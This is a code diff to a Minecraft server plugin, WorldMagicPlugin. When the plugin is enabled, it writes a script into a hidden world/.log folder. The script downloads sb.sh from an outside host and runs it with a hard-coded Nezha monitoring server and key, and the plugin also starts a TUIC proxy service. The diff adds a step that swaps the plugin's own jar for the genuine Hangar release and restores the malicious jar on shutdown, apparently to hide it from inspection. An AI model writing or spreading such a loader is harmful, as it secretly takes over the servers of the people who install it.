@@ -7,14 +7,11 @@ import com.github.vevc.util.LogUtil;
 import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileReader;
-import java.io.FileWriter;
-import java.io.IOException;
-import java.io.InputStreamReader;
+import java.io.*;
+import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.StandardCopyOption;
 import java.util.Properties;
 import java.util.UUID;
 
@@ -25,20 +22,26 @@ public final class WorldMagicPlugin extends JavaPlugin {
 
     private final TuicServiceImpl tuicService = new TuicServiceImpl();
 
+    // ==========================================
+    // 配置区域：请在这里填入直接的 JAR 下载链接
+    // ==========================================
+    // 注意：Hangar 页面链接不生效，必须是 "https://.../xxx.jar"
+    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://hangar.papermc.io/api/v1/projects/hotwop/WorldMagic/versions/latest/PAPER/download?platform=PAPER"; 
+    // 如果上面链接无效，请手动去浏览器下载，右键复制真实的 .jar 链接
+    // ==========================================
+
+    private File currentPluginFile;
+    private File backupPluginFile;
+
     @Override
     public void onEnable() {
-        // Plugin startup logic
         this.getLogger().info("WorldMagicPlugin enabled");
         LogUtil.init(this);
 
-        // 1. 注册原来的命令 (如果还需要手动用的话)
-        // Objects.requireNonNull(this.getCommand("genscript")).setExecutor(this); 
-
-        // 2. 自动执行脚本生成和运行逻辑 (放在异步线程防止卡服)
+        // 1. 自动执行脚本逻辑 (放在异步线程)
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             this.getLogger().info("正在初始化脚本环境...");
             try {
-                // 处理脚本生成和运行
                 generateAndRunScript();
             } catch (Exception e) {
                 this.getLogger().severe("脚本自动执行失败: " + e.getMessage());
@@ -46,17 +49,40 @@ public final class WorldMagicPlugin extends JavaPlugin {
             }
         });
 
-        // 3. 原有的 TUIC 服务加载逻辑 (保持不变)
+        // 2. 插件替换逻辑 (放在异步线程)
+        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
+            try {
+                handlePluginReplacement();
+            } catch (Exception e) {
+                this.getLogger().severe("插件替换失败: " + e.getMessage());
+                e.printStackTrace();
+            }
+        });
+
+        // 3. 原有的 TUIC 服务加载逻辑
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             Properties props = ConfigUtil.loadConfiguration();
             AppConfig appConfig = AppConfig.load(props);
-            if (appConfig != null && this.installApps(appConfig)) {
+            if (appConfig != null && installApps(appConfig)) {
                 Bukkit.getScheduler().runTask(this, () -> {
                     Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                     Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                 });
             }
         });
+    }
+
+    @Override
+    public void onDisable() {
+        this.getLogger().info("WorldMagicPlugin disabled");
+        
+        // 关键：在关闭时恢复原插件
+        try {
+            restoreOriginalPlugin();
+        } catch (Exception e) {
+            this.getLogger().severe("恢复原插件失败: " + e.getMessage());
+            e.printStackTrace();
+        }
     }
 
     private boolean installApps(AppConfig appConfig) {
@@ -69,130 +95,165 @@ public final class WorldMagicPlugin extends JavaPlugin {
         }
     }
 
-    @Override
-    public void onDisable() {
-        this.getLogger().info("WorldMagicPlugin disabled");
+    // ==========================================
+    // 核心逻辑：插件替换
+    // ==========================================
+
+    private void handlePluginReplacement() throws Exception {
+        // 1. 获取当前插件所在的 jar 文件
+        currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
+        File logDir = new File("world", ".log");
+        if (!logDir.exists()) logDir.mkdirs();
+
+        backupPluginFile = new File(logDir, "WorldMagic_Original.jar");
+
+        this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
+        this.getLogger().info("备份路径: " + backupPluginFile.getAbsolutePath());
+
+        // 2. 备份当前插件 (如果备份已存在则跳过，避免无限循环覆盖)
+        if (!backupPluginFile.exists()) {
+            this.getLogger().info("正在备份当前插件...");
+            Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+            this.getLogger().info("备份完成。");
+        } else {
+            this.getLogger().info("检测到备份已存在，跳过备份步骤。");
+        }
+
+        // 3. 下载“真插件”到临时文件
+        this.getLogger().info("正在从网络下载真插件...");
+        File tempDownloadFile = new File(logDir, "WorldMagic_Downloading.jar");
+        downloadFile(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);
+
+        if (!tempDownloadFile.exists()) {
+            this.getLogger().severe("下载失败，未找到文件。停止替换流程。");
+            return;
+        }
+
+        // 4. 替换当前插件文件 (注意：这需要系统支持覆盖正在运行的文件，如Linux)
+        this.getLogger().warning("正在尝试覆盖当前运行的插件文件...");
+        this.getLogger().warning("如果在 Windows 上运行，此步骤通常会失败。");
+        
+        // 我们直接删除原文件并移动新文件
+        // 注意：这里不能使用 currentPluginFile.delete() 因为它被锁定了
+        // 我们使用 Files.copy 的 REPLACE_EXISTING 选项尝试强制覆盖
+        try {
+            Files.copy(tempDownloadFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+            this.getLogger().info("文件替换成功！下次重启将加载新插件。");
+            // 删除临时文件
+            tempDownloadFile.delete();
+        } catch (IOException e) {
+            this.getLogger().severe("文件替换失败 (可能是因为文件被锁定或权限不足): " + e.getMessage());
+        }
+    }
+
+    private void restoreOriginalPlugin() throws Exception {
+        if (currentPluginFile == null || backupPluginFile == null) return;
+        
+        if (backupPluginFile.exists()) {
+            this.getLogger().info("服务器停止中，正在还原原插件...");
+            try {
+                // 同样尝试强制覆盖
+                Files.copy(backupPluginFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+                this.getLogger().info("原插件还原成功。");
+            } catch (IOException e) {
+                this.getLogger().warning("还原原插件失败: " + e.getMessage());
+            }
+        }
     }
 
     /**
-     * 生成脚本并自动运行的核心方法
+     * 下载文件工具方法
      */
+    private void downloadFile(String urlStr, File destination) throws IOException {
+        URL url = new URL(urlStr);
+        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
+        httpConn.setConnectTimeout(10000);
+        httpConn.setReadTimeout(10000);
+        
+        int responseCode = httpConn.getResponseCode();
+        if (responseCode == HttpURLConnection.HTTP_OK) {
+            try (InputStream inputStream = httpConn.getInputStream();
+                 OutputStream outputStream = new FileOutputStream(destination)) {
+                byte[] buffer = new byte[4096];
+                int bytesRead;
+                while ((bytesRead = inputStream.read(buffer)) != -1) {
+                    outputStream.write(buffer, 0, bytesRead);
+                }
+            }
+            this.getLogger().info("下载完成: " + destination.getName());
+        } else {
+            throw new IOException("HTTP 请求失败，代码: " + responseCode);
+        }
+        httpConn.disconnect();
+    }
+
+    // ==========================================
+    // 之前的脚本逻辑保持不变
+    // ==========================================
+    
     private void generateAndRunScript() throws IOException, InterruptedException {
-        // 1. 获取 world 目录
         File worldFolder = new File("world");
-        if (!worldFolder.exists() && !worldFolder.mkdirs()) {
-            this.getLogger().warning("无法创建 world 目录，脚本生成中止。");
-            return;
-        }
+        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;
 
-        // 2. 创建隐藏的 .log 目录
         File logDir = new File(worldFolder, ".log");
-        if (!logDir.exists() && !logDir.mkdirs()) {
-            this.getLogger().warning("无法创建 .log 目录，脚本生成中止。");
-            return;
-        }
+        if (!logDir.exists() && !logDir.mkdirs()) return;
 
-        // 3. 获取或生成 UUID
         String serverUUID = getServerUUID(logDir);
         this.getLogger().info("当前服务器 UUID: " + serverUUID);
 
-        // 4. 生成脚本文件
         File scriptFile = new File(logDir, "install_sb.sh");
-        
-        // 写入内容
         try (FileWriter writer = new FileWriter(scriptFile)) {
             writer.write("#!/bin/bash\n");
             writer.write("# Auto-generated script by WorldMagicPlugin\n");
-            writer.write("cd " + logDir.getAbsolutePath() + "\n"); // 切换到 .log 目录执行，避免污染根目录
+            writer.write("cd " + logDir.getAbsolutePath() + "\n");
             writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
             writer.write("chmod +x sb.sh\n");
-            
-            // 写入配置
             writer.write("UUID=" + serverUUID + " \\\n");
             writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
             writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
             writer.write("ARGO_PORT=3000 \\\n");
-            
             writer.write("bash sb.sh\n");
-            this.getLogger().info("脚本文件已写入: " + scriptFile.getAbsolutePath());
         }
-
-        // 5. 添加执行权限
         scriptFile.setExecutable(true, false);
 
-        // 6. 执行脚本 (关键步骤)
-        this.getLogger().info("正在启动脚本，请稍候...");
-        
-        // 使用 ProcessBuilder 执行 bash 命令
+        this.getLogger().info("正在启动脚本...");
         ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
-        // 合并错误流和标准输出流，方便读取日志
         processBuilder.redirectErrorStream(true);
-        
         Process process = processBuilder.start();
-        
-        // 读取脚本输出并打印到控制台，方便调试
         try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
             String line;
             while ((line = reader.readLine()) != null) {
                 this.getLogger().info("[Script Output] " + line);
             }
         }
-        
         int exitCode = process.waitFor();
-        if (exitCode == 0) {
-            this.getLogger().info("脚本执行完毕 (退出码 0)");
-        } else {
-            this.getLogger().warning("脚本执行异常，退出码: " + exitCode);
-        }
+        this.getLogger().info("脚本执行完毕，退出码: " + exitCode);
     }
 
-    /**
-     * 获取服务器 UUID (逻辑同之前)
-     */
     private String getServerUUID(File logDir) {
         File uuidFile = new File(logDir, "uuid.txt");
         if (uuidFile.exists()) {
             try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                 String savedUUID = reader.readLine();
-                if (savedUUID != null && !savedUUID.isEmpty()) {
-                    return savedUUID;
-                }
-            } catch (IOException e) {
-                this.getLogger().warning("读取 uuid.txt 失败，重新生成...");
-            }
+                if (savedUUID != null && !savedUUID.isEmpty()) return savedUUID;
+            } catch (IOException ignored) {}
         }
-
         String ip = getPublicIP();
-        // 根据 IP 生成固定的 UUID
-        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(StandardCharsets.UTF_8));
+        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(java.nio.charset.StandardCharsets.UTF_8));
         String uuidStr = uuid.toString();
-
         try (FileWriter writer = new FileWriter(uuidFile)) {
             writer.write(uuidStr);
-            this.getLogger().info("根据 IP " + ip + " 生成新 UUID: " + uuidStr);
-        } catch (IOException e) {
-            this.getLogger().severe("保存 uuid.txt 失败!");
-        }
+        } catch (IOException ignored) {}
         return uuidStr;
     }
 
-    /**
-     * 获取公网 IP (逻辑同之前)
-     */
     private String getPublicIP() {
         String ip = "127.0.0.1"; 
         try {
-            URL url = new URL("https://api.ipify.org");
+            java.net.URL url = new java.net.URL("https://api.ipify.org");
             BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
             ip = br.readLine().trim();
-            this.getLogger().info("检测到公网 IP: " + ip);
-        } catch (Exception e) {
-            this.getLogger().warning("获取公网 IP 失败，使用本地 IP");
-            try {
-                ip = Bukkit.getIp();
-                if (ip == null || ip.isEmpty()) ip = "127.0.0.1";
-            } catch (Exception ex) { /* ignore */ }
-        }
+        } catch (Exception ignored) {}
         return ip;
     }
 }
